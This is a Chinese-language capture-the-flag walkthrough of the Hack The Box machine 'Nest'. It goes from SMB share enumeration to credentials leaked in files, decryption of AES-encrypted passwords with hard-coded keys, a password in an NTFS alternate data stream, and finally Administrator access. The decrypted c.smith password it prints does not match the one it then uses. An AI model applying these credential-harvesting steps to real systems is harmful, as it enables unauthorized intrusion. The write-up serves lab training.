# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测

查看开放端口
```
┌──(root💀kali)-[~/htb/Nest]
└─# nmap -p- 10.10.10.178 --open               
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-28 09:26 EST
Nmap scan report for 10.10.10.178
Host is up (0.26s latency).
Not shown: 65533 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
445/tcp  open  microsoft-ds
4386/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 645.94 seconds

```

查看端口信息
```
(root💀kali)-[~/htb/Nest]
└─# nmap -sV -T4 -A -O -p 445,4386 10.10.10.178
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-28 09:38 EST
Nmap scan report for 10.10.10.178
Host is up (0.30s latency).

PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help: 
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR <Directory_Name>
|     RUNQUERY <Query_ID>
|     DEBUG <Password>
|_    HELP <Command>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4386-TCP:V=7.91%I=7%D=12/28%Time=61CB216C%P=x86_64-pc-linux-gnu%r(N
SF:ULL,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(GenericLi
SF:nes,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognis
SF:ed\x20command\r\n>")%r(GetRequest,3A,"\r\nHQK\x20Reporting\x20Service\x
SF:20V1\.2\r\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(HTTPOptions,3A,"\r
SF:\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20comm
SF:and\r\n>")%r(RTSPRequest,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r
SF:\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(RPCCheck,21,"\r\nHQK\x20Rep
SF:orting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSVersionBindReqTCP,21,"\r\nHQ
SF:K\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSStatusRequestTCP,21,
SF:"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Help,F2,"\r\nHQK
SF:\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nThis\x20service\x20allows
SF:\x20users\x20to\x20run\x20queries\x20against\x20databases\x20using\x20t
SF:he\x20legacy\x20HQK\x20format\r\n\r\n---\x20AVAILABLE\x20COMMANDS\x20--
SF:-\r\n\r\nLIST\r\nSETDIR\x20<Directory_Name>\r\nRUNQUERY\x20<Query_ID>\r
SF:\nDEBUG\x20<Password>\r\nHELP\x20<Command>\r\n>")%r(SSLSessionReq,21,"\
SF:r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TerminalServerCook
SF:ie,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TLSSession
SF:Req,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Kerberos,
SF:21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(SMBProgNeg,21
SF:,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(X11Probe,21,"\r
SF:\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(FourOhFourRequest,3
SF:A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x2
SF:0command\r\n>")%r(LPDString,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.
SF:2\r\n\r\n>")%r(LDAPSearchReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\
SF:.2\r\n\r\n>")%r(LDAPBindReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.
SF:2\r\n\r\n>")%r(SIPOptions,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\
SF:r\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(LANDesk-RC,21,"\r\nHQK\x20
SF:Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TerminalServer,21,"\r\nHQK\x
SF:20Reporting\x20Service\x20V1\.2\r\n\r\n>");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-12-28T14:41:29
|_  start_date: 2021-12-28T14:24:52

TRACEROUTE (using port 4386/tcp)
HOP RTT       ADDRESS
1   307.68 ms 10.10.14.1
2   307.76 ms 10.10.10.178

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 220.72 seconds

```
只开启了samba和一个未知的服务，先从samba开始

## SMB

用enum4linux没查出来有价值的东西。

使用smbclient无密码探测分项目录
```
──(root💀kali)-[~/htb/Nest]
└─# smbclient --no-pass -L //10.10.10.178                                                                     127 ⨯

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        Secure$         Disk      
        Users           Disk      
SMB1 disabled -- no workgroup available

```

Data目录可以进入Shared文件夹
```
┌──(root💀kali)-[~/htb/Nest]
└─# smbclient --no-pass //10.10.10.178/Data
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug  7 18:53:46 2019
  ..                                  D        0  Wed Aug  7 18:53:46 2019
  IT                                  D        0  Wed Aug  7 18:58:07 2019
  Production                          D        0  Mon Aug  5 17:53:38 2019
  Reports                             D        0  Mon Aug  5 17:53:44 2019
  Shared                              D        0  Wed Aug  7 15:07:51 2019

                5242623 blocks of size 4096. 1839726 blocks available

```
无密码只能进入shared目录
把shared里两个文件夹下载到本地，貌似爆出了一个账号密码
```
┌──(root💀kali)-[~/htb/Nest]
└─# ls                                                                                                        130 ⨯
'Maintenance Alerts.txt'  'Welcome Email.txt'
                                                                                                                    
┌──(root💀kali)-[~/htb/Nest]
└─# cat Maintenance\ Alerts.txt 
There is currently no scheduled maintenance work                                                                                                                    
┌──(root💀kali)-[~/htb/Nest]
└─# cat Welcome\ Email.txt     
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR      
```

使用上面的账号密码查看Users目录

```
┌──(root💀kali)-[~/htb/Nest]
└─# smbclient -U 'TempUser%welcome2019' //10.10.10.178/Users                                                    1 ⨯
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 25 18:04:21 2020
  ..                                  D        0  Sat Jan 25 18:04:21 2020
  Administrator                       D        0  Fri Aug  9 11:08:23 2019
  C.Smith                             D        0  Sun Jan 26 02:21:44 2020
  L.Frost                             D        0  Thu Aug  8 13:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 13:02:50 2019
  TempUser                            D        0  Wed Aug  7 18:55:56 2019
c
                5242623 blocks of size 4096. 1839582 blocks available
smb: \> cd TempUser
smb: \TempUser\> ls
  .                                   D        0  Wed Aug  7 18:55:56 2019
  ..                                  D        0  Wed Aug  7 18:55:56 2019
  New Text Document.txt               A        0  Wed Aug  7 18:55:56 2019

```
# user.txt
使用TempUser账号密码再次查看之前没有权限查看的目录文件夹
```
┌──(root💀kali)-[~/htb/Nest]
└─# smbclient -U 'TempUser%welcome2019' //10.10.10.178/Data                                                   130 ⨯
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug  7 18:53:46 2019
  ..                                  D        0  Wed Aug  7 18:53:46 2019
  IT                                  D        0  Wed Aug  7 18:58:07 2019
  Production                          D        0  Mon Aug  5 17:53:38 2019
  Reports                             D        0  Mon Aug  5 17:53:44 2019
  Shared                              D        0  Wed Aug  7 15:07:51 2019

```
这次我们有了更多文件夹的查阅权限



下载所有Data目录的文件
```
smb: \> recurse on
smb: \> prompt off
smb: \> mget *

```

在```\IT\Configs\RU Scanner```下找到一个配置文件，爆出了```c.smith```的账号密码
```
┌──(root💀kali)-[~/htb/Nest]
└─# cat RU_config.xml                                                                                           1 ⨯
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile>  
```

用john无法识别上面密码的哈希，也不知道具体的加密算法

## 路径提示
在```IT/Configs/NotepadPlusPlus/config.xml```找到一个确认存在的文件夹Carl：
```
<History nbMaxFile="15" inSubMenu="no" customLength="-1">
        <File filename="C:\windows\System32\drivers\etc\hosts" />
        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
    </History>

```

在TempUser权限下我们无法查看Secure$目录下的文件
```
┌──(root💀kali)-[~/htb/Nest]
└─# smbclient -U 'TempUser%welcome2019' //10.10.10.178/Secure$                                                130 ⨯
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug  7 19:08:12 2019
  ..                                  D        0  Wed Aug  7 19:08:12 2019
  Finance                             D        0  Wed Aug  7 15:40:13 2019
  HR                                  D        0  Wed Aug  7 19:08:11 2019
  IT                                  D        0  Thu Aug  8 06:59:25 2019
cd 
                5242623 blocks of size 4096. 1839933 blocks available
smb: \> cd IT
smb: \IT\> ls
NT_STATUS_ACCESS_DENIED listing \IT\*

```
但是如果我们知道这个目录下肯定有一个文件夹，就可以直接进入，前提是这个文件夹我们有查看权限
```
smb: \IT\> cd carl
smb: \IT\carl\> ls
  .                                   D        0  Wed Aug  7 15:42:14 2019
  ..                                  D        0  Wed Aug  7 15:42:14 2019
  Docs                                D        0  Wed Aug  7 15:44:00 2019
  Reports                             D        0  Tue Aug  6 09:45:40 2019
  VB Projects                         D        0  Tue Aug  6 10:41:55 2019

                5242623 blocks of size 4096. 1839933 blocks available

```

在```Secure$\IT\carl\VB Projects\wip\ru\RUScanner\```下找到一些vb文件
```
smb: \IT\carl\VB Projects\wip\ru\RUScanner\> ls
  .                                   D        0  Wed Aug  7 18:05:54 2019
  ..                                  D        0  Wed Aug  7 18:05:54 2019
  bin                                 D        0  Wed Aug  7 16:00:11 2019
  ConfigFile.vb                       A      772  Wed Aug  7 18:05:09 2019
  Module1.vb                          A      279  Wed Aug  7 18:05:44 2019
  My Project                          D        0  Wed Aug  7 16:00:11 2019
  obj                                 D        0  Wed Aug  7 16:00:11 2019
  RU Scanner.vbproj                   A     4828  Fri Aug  9 11:37:51 2019
  RU Scanner.vbproj.user              A      143  Tue Aug  6 08:55:27 2019
  SsoIntegration.vb                   A      133  Wed Aug  7 18:05:58 2019
  Utils.vb                            A     4888  Wed Aug  7 15:49:35 2019

```

查看，暴露出一些加解密信息
```
┌──(root💀kali)-[~/htb/Nest]
└─# cat Utils.vb  
Imports System.Text
Imports System.Security.Cryptography
Public Class Utils

    Public Shared Function GetLogFilePath() As String
        Return IO.Path.Combine(Environment.CurrentDirectory, "Log.txt")
    End Function




    Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function EncryptString(PlainString As String) As String
        If String.IsNullOrEmpty(PlainString) Then
            Return String.Empty
        Else
            Return Encrypt(PlainString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function Encrypt(ByVal plainText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

...
```

留意passPhrase,saltValue,passwordIterations,initVector,keySize这几个值是写死的，结合上面c.smith账号的密文去到这个[这个网站](https://dotnetfiddle.net/kiYWi4)

解密出来是：```RxRxPANCAK3SxRxRx```


使用Smith的账号密码再次登录Users目录，拿到user.txt
```
┌──(root💀kali)-[~/htb/Nest]
└─# smbclient -U 'c.smith%xRxRxPANCAK3SxRxRx' //10.10.10.178/Users                                            130 ⨯
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 25 18:04:21 2020
  ..                                  D        0  Sat Jan 25 18:04:21 2020
  Administrator                       D        0  Fri Aug  9 11:08:23 2019
  C.Smith                             D        0  Sun Jan 26 02:21:44 2020
  L.Frost                             D        0  Thu Aug  8 13:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 13:02:50 2019
  TempUser                            D        0  Wed Aug  7 18:55:56 2019

                5242623 blocks of size 4096. 1839710 blocks available
smb: \> cd C.Smith
smb: \C.Smith\> ls
  .                                   D        0  Sun Jan 26 02:21:44 2020
  ..                                  D        0  Sun Jan 26 02:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 19:06:17 2019
  user.txt                            A       34  Tue Dec 28 09:25:11 2021

```


找到一个备份的配置文件,看起来是我们上面扫描靶机4386未知服务的配置文件
```
└─# cat HQK_Config_Backup.xml    
<?xml version="1.0"?>
<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>4386</Port>
  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
</ServiceSettings>  
```
## 文件隐写
有一个```Debug Mode Password.txt```文件，但是看字节数是一个空文件
```
smb: \C.Smith\HQK Reporting\> ls
  .                                   D        0  Thu Aug  8 19:06:17 2019
  ..                                  D        0  Thu Aug  8 19:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 08:18:42 2019
  Debug Mode Password.txt             A        0  Thu Aug  8 19:08:17 2019
  HQK_Config_Backup.xml               A      249  Thu Aug  8 19:09:05 2019

```

用allinfo返回这个文件的所有文件或者目录信息，看到回显了两个stream文件
```
smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time:    四 8月  8 19时06分12秒 2019 EDT
access_time:    四 8月  8 19时06分12秒 2019 EDT
write_time:     四 8月  8 19时08分17秒 2019 EDT
change_time:    三 7月 21 14时47分12秒 2021 EDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes

```

用```get "Debug Mode Password.txt:Password"```下载到本地，查看
```
┌──(root💀kali)-[~/htb/Nest]
└─# cat "Debug Mode Password.txt:Password" 
WBQ201953D8w 

```
# root.txt
telnet登录4386端口服务，使用```debug WBQ201953D8w```命令开启debug模式
```
┌──(root💀kali)-[~/htb/Nest]
└─# telnet 10.10.10.178 4386                                                                                    1 ⨯
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>debug WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
SERVICE
SESSION
SHOWQUERY <Query_ID>

```

经过简单测试上面命令意思大概相当于linux上的
SETDIR = cd
LIST = ls
SHOWQUERY = cat

HELP 后面加上上面的命令，能看到该命令的解释和示例

SHOWQUERY要查看哪个文件，后面加上list命令列出来的编号ID

SESSION可以返回当前目录和用户相关信息

SERVICE返回服务信息

去到```C:\Program Files\HQK\ldap```找到一个配置文件，暴露出了Administrator的账号密码
```
>setdir ldap

Current directory set to ldap
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Invalid database configuration found. Please contact your system administrator
>showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=

```

ldap用于保存各种用户的账户信息。

我们在```C.Smith\HQK Reporting\AD Integration Module```下找到一个exe执行文件
```
smb: \C.Smith\HQK Reporting\AD Integration Module\> ls
  .                                   D        0  Fri Aug  9 08:18:42 2019
  ..                                  D        0  Fri Aug  9 08:18:42 2019
  HqkLdap.exe                         A    17408  Wed Aug  7 19:41:16 2019

```

使用[ILSpy](https://github.com/icsharpcode/ILSpy/releases)反编译上面的exe文件，找到这个服务的加解密代码

加密：
```
public static string ES(string PlainString)
{
	if (string.IsNullOrEmpty(PlainString))
	{
		return string.Empty;
	}
	return RE(PlainString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
}

private static string RE(string plainText, string passPhrase, string saltValue, int passwordIterations, string initVector, int keySize)
{
	//Discarded unreachable code: IL_00b9
	byte[] bytes = Encoding.ASCII.GetBytes(initVector);
	byte[] bytes2 = Encoding.ASCII.GetBytes(saltValue);
	byte[] bytes3 = Encoding.ASCII.GetBytes(plainText);
	Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, bytes2, passwordIterations);
	byte[] bytes4 = rfc2898DeriveBytes.GetBytes(checked((int)Math.Round((double)keySize / 8.0)));
	AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
	aesCryptoServiceProvider.Mode = CipherMode.CBC;
	ICryptoTransform transform = aesCryptoServiceProvider.CreateEncryptor(bytes4, bytes);
	using MemoryStream memoryStream = new MemoryStream();
	using CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
	cryptoStream.Write(bytes3, 0, bytes3.Length);
	cryptoStream.FlushFinalBlock();
	byte[] inArray = memoryStream.ToArray();
	memoryStream.Close();
	cryptoStream.Close();
	return Convert.ToBase64String(inArray);
}

```


解密：
```
// HqkLdap.CR
public static string DS(string EncryptedString)
{
	if (string.IsNullOrEmpty(EncryptedString))
	{
		return string.Empty;
	}
	return RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
}

private static string RD(string cipherText, string passPhrase, string saltValue, int passwordIterations, string initVector, int keySize)
{
	byte[] bytes = Encoding.ASCII.GetBytes(initVector);
	byte[] bytes2 = Encoding.ASCII.GetBytes(saltValue);
	byte[] array = Convert.FromBase64String(cipherText);
	Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, bytes2, passwordIterations);
	checked
	{
		byte[] bytes3 = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)keySize / 8.0));
		AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.Mode = CipherMode.CBC;
		ICryptoTransform transform = aesCryptoServiceProvider.CreateDecryptor(bytes3, bytes);
		MemoryStream memoryStream = new MemoryStream(array);
		CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
		byte[] array2 = new byte[array.Length + 1];
		int count = cryptoStream.Read(array2, 0, array2.Length);
		memoryStream.Close();
		cryptoStream.Close();
		return Encoding.ASCII.GetString(array2, 0, count);
	}
}

```

留意passPhrase，saltValue，passwordIterations，initVector，keySize这几个值是写死的

再次来到```.NET Fiddle```,填入上面几个值和密文,解密出密码为：```XtH4nkS4Pl4y1nGX```


用账号登录Users目录
```
┌──(root💀kali)-[~/htb/Nest]
└─# smbclient -U 'Administrator%XtH4nkS4Pl4y1nGX' //10.10.10.178/Users                                          1 ⨯
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 25 18:04:21 2020
  ..                                  D        0  Sat Jan 25 18:04:21 2020
  Administrator                       D        0  Fri Aug  9 11:08:23 2019
  C.Smith                             D        0  Sun Jan 26 02:21:44 2020
  L.Frost                             D        0  Thu Aug  8 13:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 13:02:50 2019
  TempUser                            D        0  Wed Aug  7 18:55:56 2019

                5242623 blocks of size 4096. 1839646 blocks available
smb: \> cd Administrator
smb: \Administrator\> ls
  .                                   D        0  Fri Aug  9 11:08:23 2019
  ..                                  D        0  Fri Aug  9 11:08:23 2019
  flag.txt - Shortcut.lnk             A     2384  Fri Aug  9 11:10:15 2019

```

查看这个flag的连接信息,显示flag在桌面下
```
┌──(root💀kali)-[~/htb/Nest]
└─# strings flag.txt\ -\ Shortcut.lnk                             
\\HTB-NEST\C$
Users\Administrator\Desktop\flag.txt
htb-nest
1SPS0
1SPSLX
1SPS
jc(=
1SPS0
1SPS:
1SPSsC
\\Htb-nest\c$
Microsoft Network
Default share
Users
ADMINI~1
        OVb
Desktop
        OVb*
flag.txt
\\Htb-nest\c$\Users\Administrator\Desktop\flag.txt

```

使用下面命令登录C盘
> smbclient -U 'Administrator%XtH4nkS4Pl4y1nGX' //10.10.10.178/c$ 

找到root.txt
```
smb: \users\Administrator\Desktop\> ls
  .                                  DR        0  Wed Jul 21 14:27:44 2021
  ..                                 DR        0  Wed Jul 21 14:27:44 2021
  desktop.ini                       AHS      282  Sat Jan 25 17:02:44 2020
  root.txt                           AR       34  Tue Dec 28 09:25:11 2021

                5242623 blocks of size 4096. 1839646 blocks available

```